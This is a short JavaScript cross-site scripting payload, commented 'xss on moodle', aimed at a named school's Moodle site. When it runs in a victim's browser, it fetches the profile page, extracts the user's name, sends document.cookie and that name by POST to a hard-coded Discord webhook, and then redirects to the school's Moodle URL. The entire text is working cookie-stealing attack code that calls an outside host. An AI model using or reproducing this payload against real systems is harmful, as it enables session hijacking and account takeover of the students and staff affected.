fetch("/moodle/user/profile.php").then(t=>t.text()).then(t=>fetch("https://discord.com/api/webhooks/1018619501547368549/JgXrPAMwhUwYJpFzs8wd40R15rrGnu-G0bGMl_YoqgP57YU6RhHeTu8j-y3wNhDOMMNy",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:document.cookie+" -> "+t.split("<title>")[1].split(": ")[0]})}));
console.log("xss on moodle")
document.location.href="https://gymkyjov.cz/moodle"
